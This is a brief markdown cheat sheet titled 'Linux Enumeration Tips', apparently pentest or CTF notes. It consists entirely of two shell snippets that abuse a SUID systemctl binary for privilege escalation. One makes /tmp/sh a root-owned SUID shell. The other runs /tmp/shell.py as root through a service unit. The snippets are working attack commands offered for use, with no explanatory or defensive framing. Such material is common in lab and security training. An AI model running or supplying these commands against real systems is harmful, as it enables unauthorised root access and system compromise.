# Linux Enumeration Tips


## /bin/systemctl
```
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chown root:root /tmp/sh; chmod u+s /tmp/sh"
[Install]
WantedBy=multi-user.target' > $TF
./systemctl link $TF
./systemctl enable --now $TF

TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "python /tmp/shell.py"
[Install]
WantedBy=multi-user.target' > $TF
./systemctl link $TF
./systemctl enable --now $TF
```